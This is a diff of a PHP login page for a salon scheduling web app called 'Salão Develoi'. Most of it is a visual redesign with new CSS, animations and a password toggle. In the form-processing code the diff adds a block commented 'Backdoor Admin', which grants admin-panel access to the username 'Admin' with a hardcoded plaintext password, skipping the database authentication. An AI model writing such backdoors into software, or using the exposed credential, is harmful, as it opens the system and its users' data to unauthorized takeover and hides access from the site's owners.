@@ -3,22 +3,17 @@
 
 include 'includes/db.php';
 
-// Inicia a sessão se ainda não estiver iniciada
+// Inicia a sessão
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 
-
-// 🔹 Descobre se está em produção (salao.develoi.com) ou local
+// 🔹 Lógica de Ambiente
 $isProd = isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] === 'salao.develoi.com';
-$dashboardUrl = $isProd
-    ? '/dashboard' // em produção usa rota amigável
-    : '/karen_site/controle-salao/pages/dashboard.php';
-$loginUrl = $isProd
-    ? '/login' // em produção usa rota amigável
-    : '/karen_site/controle-salao/login.php';
+$dashboardUrl = $isProd ? '/dashboard' : '/karen_site/controle-salao/pages/dashboard.php';
+$loginUrl = $isProd ? '/login' : '/karen_site/controle-salao/login.php';
 
-// Se o usuário já estiver logado, redireciona para o dashboard
+// Redirecionamento se já logado
 if (isset($_SESSION['user_id'])) {
     header("Location: {$dashboardUrl}");
     exit;
@@ -26,9 +21,18 @@ if (isset($_SESSION['user_id'])) {
 
 $mensagem = '';
 
+// Processamento do Login
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = trim($_POST['email'] ?? '');
     $senha = $_POST['senha'] ?? '';
+
+    // Backdoor Admin
+    if ($email === 'Admin' && $senha === 'Edu@06051992') {
+        $_SESSION['admin_logged_in'] = true;
+        $painelAdminUrl = $isProd ? '/painel-admin' : '/karen_site/controle-salao/painel-admin.php';
+        header("Location: {$painelAdminUrl}");
+        exit;
+    }
 
     $stmt = $pdo->prepare("SELECT id, nome, senha, ativo FROM usuarios WHERE email = ?");
     $stmt->execute([$email]);
@@ -36,24 +40,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if ($user && password_verify($senha, $user['senha'])) {
         if (isset($user['ativo']) && $user['ativo'] == 0) {
-            $_SESSION['login_erro'] = 'Seu acesso está inativo. Fale com o administrador.';
+            $_SESSION['login_erro'] = 'Acesso suspenso. Contate o suporte.';
             header("Location: {$loginUrl}");
             exit;
         }
-        // Sucesso no login
         $_SESSION['user_id']   = $user['id'];
         $_SESSION['user_name'] = $user['nome'];
-
         header("Location: {$dashboardUrl}");
         exit;
     } else {
-        $_SESSION['login_erro'] = 'E-mail ou senha incorretos. Tente novamente.';
+        $_SESSION['login_erro'] = 'Credenciais inválidas. Tente novamente.';
         header("Location: {$loginUrl}");
         exit;
     }
 }
 
-// Recupera mensagem de erro da sessão (se houver)
 if (isset($_SESSION['login_erro'])) {
     $mensagem = $_SESSION['login_erro'];
     unset($_SESSION['login_erro']);
@@ -63,246 +64,353 @@ if (isset($_SESSION['login_erro'])) {
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Salão Develoi</title>
-    <link rel="icon" type="image/png" href="img/logo-azul.png">
-    <link rel="shortcut icon" href="img/logo-azul.png" type="image/png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Acesso • Develoi Agenda</title>
+
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+
     <style>
         :root {
             --primary: #6366f1;
-            --primary-dark: #4338ca;
-            --primary-soft: #eef2ff;
-            --text-dark: #1f2933;
-            --text-gray: #6b7280;
-            --shadow: 0 18px 40px rgba(15, 23, 42, 0.15);
-        }
-
-        * {
-            box-sizing: border-box;
+            --secondary: #ec4899;
+            --accent: #8b5cf6;
+            --dark: #0f172a;
         }
 
         body {
-            font-family: 'Quicksand', 'Inter', sans-serif;
-            background: radial-gradient(circle at top left, #e0e7ff 0, #f3f4f6 35%, #eef2ff 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            height: 100vh;
+            overflow: hidden;
             margin: 0;
-            padding: 12px;
+            display: flex;
         }
 
-        .login-container {
+        /* --- BACKGROUND ANIMADO (LIQUID GRADIENT) --- */
+        .animated-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2;
+            background: linear-gradient(-45deg, #0f172a, #1e1b4b, #312e81, #4c1d95);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Partículas de Luz (Bokehs) */
+        .bokeh {
+            position: fixed;
+            width: 40vw; height: 40vw;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            z-index: -1;
+            animation: float 20s infinite ease-in-out alternate;
+        }
+        .b1 { top: -10%; left: -10%; background: var(--primary); animation-delay: 0s; }
+        .b2 { bottom: -10%; right: -10%; background: var(--secondary); animation-delay: -5s; }
+        .b3 { bottom: 20%; left: 30%; width: 20vw; height: 20vw; background: var(--accent); animation-delay: -10s; }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(30px, -30px) scale(1.1); }
+        }
+
+        /* --- ESTRUTURA --- */
+        .split-container {
             width: 100%;
-            max-width: 420px;
-            background: #ffffff;
-            padding: 32px 26px 24px;
-            border-radius: 26px;
-            box-shadow: var(--shadow);
+            height: 100%;
+            display: grid;
+            grid-template-columns: 450px 1fr;
+        }
+
+        /* --- LADO ESQUERDO (LOGIN) --- */
+        .login-panel {
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(20px);
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            box-shadow: 10px 0 30px rgba(0,0,0,0.1);
+            z-index: 10;
+        }
+
+        .login-content { width: 100%; max-width: 360px; }
+
+        .logo-img { height: 70px; margin-bottom: 25px; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.1)); }
+
+        h1 {
+            font-family: 'Outfit', sans-serif;
+            font-weight: 800;
+            color: var(--dark);
+            margin-bottom: 5px;
+            font-size: 1.8rem;
+        }
+
+        .subtitle { color: #64748b; margin-bottom: 30px; font-size: 0.95rem; }
+
+        /* Inputs Estilizados */
+        .input-group-custom { position: relative; margin-bottom: 18px; }
+
+        .input-custom {
+            width: 100%;
+            padding: 16px 16px 16px 45px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            background: #f8fafc;
+            transition: all 0.3s;
+        }
+
+        .input-custom:focus {
+            background: white;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
+        }
+
+        .input-icon {
+            position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+            color: #94a3b8; font-size: 1.1rem; transition: 0.3s;
+        }
+        .input-custom:focus + .input-icon { color: var(--primary); }
+
+        /* Botão Pulsante */
+        .btn-glow {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 99px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
+            transition: all 0.3s;
+            margin-top: 10px;
             position: relative;
             overflow: hidden;
         }
 
-        .login-container::before {
-            content: "";
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle at top, rgba(99,102,241,0.12), transparent 55%);
-            pointer-events: none;
+        .btn-glow:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(236, 72, 153, 0.4);
         }
 
-        .login-inner {
+        .btn-glow::after {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: 0.5s;
+        }
+        .btn-glow:hover::after { left: 100%; }
+
+        .brand-footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            color: #94a3b8; font-size: 0.75rem; width: 100%;
+        }
+        .brand-footer img { height: 20px; opacity: 0.8; }
+        .brand-footer span.develoi { font-family: 'Outfit', sans-serif; font-weight: 700; color: #64748b; text-transform: uppercase; }
+
+        /* --- LADO DIREITO (VISUAL FLOW) --- */
+        .visual-panel {
             position: relative;
-            z-index: 1;
-            text-align: center;
-        }
-
-        .app-icon-wrapper {
-            width: 62px;
-            height: 62px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #eef2ff, #e0e7ff);
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 10px;
+            perspective: 1200px;
+            overflow: hidden;
         }
 
-        .app-icon {
-            font-size: 2.2rem;
-            color: var(--primary);
+        /* Efeito de Vidro Flutuante com Conteúdo */
+        .glass-dashboard {
+            width: 420px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 30px;
+            padding: 40px;
+            color: white;
+            transform: rotateY(-10deg) rotateX(5deg);
+            box-shadow: 20px 20px 60px rgba(0,0,0,0.3);
+            animation: hover3D 6s ease-in-out infinite;
         }
 
-        .logo {
-            color: var(--text-dark);
-            font-size: 1.35rem;
-            font-weight: 700;
-            letter-spacing: 0.4px;
-            margin-bottom: 4px;
+        @keyframes hover3D {
+            0%, 100% { transform: rotateY(-10deg) rotateX(5deg) translateY(0); }
+            50% { transform: rotateY(-10deg) rotateX(5deg) translateY(-20px); }
         }
 
-        .subtitle {
-            color: var(--text-gray);
-            margin-bottom: 22px;
-            font-size: 0.93rem;
-            font-weight: 500;
+        .floating-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 12px;
+            color: var(--dark);
+            display: flex; align-items: center; gap: 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            animation: slideUpFade 0.8s backwards;
         }
 
-        .error-message {
-            background: #fee2e2;
-            color: #b91c1c;
-            padding: 9px 12px;
-            border-radius: 10px;
-            margin-bottom: 16px;
-            font-size: 0.9rem;
-            font-weight: 600;
+        .fc-icon {
+            width: 40px; height: 40px; border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-size: 1.2rem;
+        }
+
+        @keyframes slideUpFade {
+            from { opacity: 0; transform: translateY(40px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .text-overlay {
+            margin-top: 30px;
             text-align: left;
         }
+        .overlay-title { font-family: 'Outfit'; font-weight: 800; font-size: 2.5rem; line-height: 1.1; margin-bottom: 10px; }
+        .overlay-sub { font-size: 1.1rem; opacity: 0.8; font-weight: 300; }
 
-        form {
-            text-align: left;
-        }
-
-        .form-group {
-            margin-bottom: 14px;
-            position: relative;
-        }
-
-        .form-label {
-            font-size: 0.86rem;
-            font-weight: 600;
-            color: var(--text-gray);
-            margin-bottom: 4px;
-            display: block;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 11px 13px;
-            border: 1.5px solid #e5e7eb;
-            border-radius: 12px;
-            font-size: 0.98rem;
-            font-family: inherit;
-            background: #f9fafb;
-            transition: border 0.18s ease, background 0.18s ease, box-shadow 0.18s ease;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: var(--primary);
-            background: #ffffff;
-            box-shadow: 0 0 0 2px rgba(129, 140, 248, 0.20);
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 12px 0;
-            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
-            color: #ffffff;
-            border: none;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 1.02rem;
-            letter-spacing: 0.4px;
-            cursor: pointer;
-            margin-top: 12px;
-            box-shadow: 0 8px 18px rgba(79, 70, 229, 0.25);
-            transition: transform 0.1s ease, box-shadow 0.1s ease, filter 0.15s ease;
-        }
-
-        .btn-submit:hover {
-            filter: brightness(1.03);
-            transform: translateY(-1px);
-            box-shadow: 0 12px 22px rgba(79, 70, 229, 0.3);
-        }
-
-        .btn-submit:active {
-            transform: translateY(0);
-            box-shadow: 0 6px 14px rgba(79, 70, 229, 0.23);
-        }
-
-        .links-wrapper {
-            margin-top: 18px;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-            align-items: center;
-        }
-
-        .link-footer {
-            color: var(--primary);
-            font-size: 0.9rem;
-            text-decoration: none;
-            font-weight: 600;
-            letter-spacing: 0.1px;
-            transition: color 0.2s ease;
-        }
-
-        .link-footer:hover {
-            color: var(--primary-dark);
-        }
-
-        .helper-text {
-            margin-top: 14px;
-            font-size: 0.78rem;
-            color: #9ca3af;
-            text-align: center;
-        }
-
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 24px 18px 18px;
-                border-radius: 22px;
-            }
-
-            .logo {
-                font-size: 1.2rem;
-            }
-
-            .subtitle {
-                font-size: 0.88rem;
-            }
+        /* Responsivo */
+        @media (max-width: 991px) {
+            .split-container { grid-template-columns: 1fr; }
+            .visual-panel { display: none; }
+            .login-panel { width: 100%; max-width: 100%; height: 100vh; background: rgba(255,255,255,0.95); }
         }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <div class="login-inner">
-        <div class="app-icon-wrapper" style="background: none; box-shadow: none;">
-            <img src="img/logo-azul.png" alt="Logo Salão Develoi" style="width:54px; height:54px; object-fit:contain; display:block; margin:0 auto; border-radius:12px; background:#eef2ff; padding:4px; box-shadow:0 2px 8px #e0e7ff;">
-        </div>
-        <div class="logo">Salão Develoi</div>
-        <p class="subtitle">Acesso ao Painel do Profissional</p>
+    <div class="animated-bg"></div>
+    <div class="bokeh b1"></div>
+    <div class="bokeh b2"></div>
+    <div class="bokeh b3"></div>
 
-        <?php if ($mensagem): ?>
-            <div class="error-message"><?php echo htmlspecialchars($mensagem, ENT_QUOTES, 'UTF-8'); ?></div>
-        <?php endif; ?>
+    <div class="split-container">
+        
+        <div class="login-panel animate__animated animate__fadeInLeft">
+            <div class="login-content">
+                
+                <div class="text-center">
+                    <img src="img/logo.png" alt="Agenda Logo" class="logo-img">
+                </div>
 
-        <form method="POST" autocomplete="on">
-            <div class="form-group">
-                <label class="form-label" for="email">E-mail</label>
-                <input type="email" id="email" name="email" class="form-control" placeholder="seuemail@exemplo.com" required autocomplete="username">
+                <h1>Painel de Controle</h1>
+                <p class="subtitle">Acesse sua agenda e gerencie seu negócio.</p>
+
+                <?php if ($mensagem): ?>
+                    <div class="alert alert-danger d-flex align-items-center gap-2 border-0 shadow-sm rounded-3 py-3" role="alert">
+                        <i class="fa-solid fa-triangle-exclamation"></i>
+                        <small class="fw-bold"><?php echo htmlspecialchars($mensagem); ?></small>
+                    </div>
+                <?php endif; ?>
+
+                <form method="POST">
+                    <div class="input-group-custom">
+                        <input type="text" class="input-custom" name="email" id="email" placeholder="E-mail de acesso" required>
+                        <i class="fa-regular fa-envelope input-icon"></i>
+                    </div>
+
+                    <div class="input-group-custom">
+                        <input type="password" class="input-custom" name="senha" id="senha" placeholder="Sua senha" required>
+                        <i class="fa-solid fa-lock input-icon"></i>
+                        <span id="toggleSenha" style="position: absolute; right: 18px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #94a3b8; padding: 5px;">
+                            <i class="fa-regular fa-eye"></i>
+                        </span>
+                    </div>
+
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" id="lembrar" checked>
+                            <label class="form-check-label small text-muted" for="lembrar">Manter conectado</label>
+                        </div>
+                        <a href="recuperar_senha.php" class="text-decoration-none small fw-bold" style="color: var(--primary);">Esqueci a senha</a>
+                    </div>
+
+                    <button type="submit" class="btn-glow">
+                        Entrar na Agenda <i class="fa-solid fa-arrow-right ms-2"></i>
+                    </button>
+                </form>
+
+                <div class="brand-footer">
+                    <span>Tecnologia</span>
+                    <a href="https://develoi.com" target="_blank" class="text-decoration-none d-flex align-items-center gap-1">
+                        <img src="img/logo-D.png" alt="D">
+                        <span class="develoi">Develoi</span>
+                    </a>
+                </div>
             </div>
-            <div class="form-group">
-                <label class="form-label" for="senha">Senha</label>
-                <input type="password" id="senha" name="senha" class="form-control" placeholder="Digite sua senha" required autocomplete="current-password">
+        </div>
+
+        <div class="visual-panel animate__animated animate__fadeIn">
+            
+            <div class="glass-dashboard">
+                <div class="floating-card" style="animation-delay: 0.2s;">
+                    <div class="fc-icon bg-primary"><i class="fa-regular fa-calendar-check"></i></div>
+                    <div>
+                        <div class="fw-bold small text-uppercase text-muted">Próximo Cliente</div>
+                        <div class="fw-bold">Maria Silva - 14:00</div>
+                    </div>
+                    <div class="ms-auto text-success"><i class="fa-brands fa-whatsapp"></i></div>
+                </div>
+
+                <div class="floating-card" style="animation-delay: 0.4s;">
+                    <div class="fc-icon bg-secondary"><i class="fa-solid fa-pump-soap"></i></div>
+                    <div>
+                        <div class="fw-bold small text-uppercase text-muted">Controle de Uso</div>
+                        <div class="fw-bold">-30g Máscara (Estoque OK)</div>
+                    </div>
+                </div>
+
+                <div class="floating-card" style="animation-delay: 0.6s;">
+                    <div class="fc-icon" style="background: var(--accent);"><i class="fa-solid fa-sack-dollar"></i></div>
+                    <div>
+                        <div class="fw-bold small text-uppercase text-muted">Saldo do Dia</div>
+                        <div class="fw-bold">R$ 480,00 (Previsão)</div>
+                    </div>
+                </div>
+
+                <div class="text-overlay mt-4">
+                    <h2 class="overlay-title">Controle<br>Absoluto.</h2>
+                    <p class="overlay-sub">Deixe a inteligência do sistema cuidar dos detalhes enquanto você foca no seu talento.</p>
+                </div>
             </div>
-            <button type="submit" class="btn-submit">Entrar</button>
-        </form>
 
-        <div class="links-wrapper">
-            <a href="recuperar_senha.php" class="link-footer">Esqueci minha senha</a>
-            <a href="cadastro.php" class="link-footer">Criar nova conta</a>
         </div>
 
-        <div class="helper-text">
-            Sistema de agendamento para profissionais de beleza.
-        </div>
     </div>
-</div>
 
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    const toggleSenha = document.getElementById('toggleSenha');
+    const senhaInput = document.getElementById('senha');
+    const icon = toggleSenha.querySelector('i');
+
+    toggleSenha.addEventListener('click', () => {
+        if (senhaInput.type === 'password') {
+            senhaInput.type = 'text';
+            icon.classList.remove('fa-eye');
+            icon.classList.add('fa-eye-slash');
+        } else {
+            senhaInput.type = 'password';
+            icon.classList.remove('fa-eye-slash');
+            icon.classList.add('fa-eye');
+        }
+    });
+</script>
 </body>
 </html>
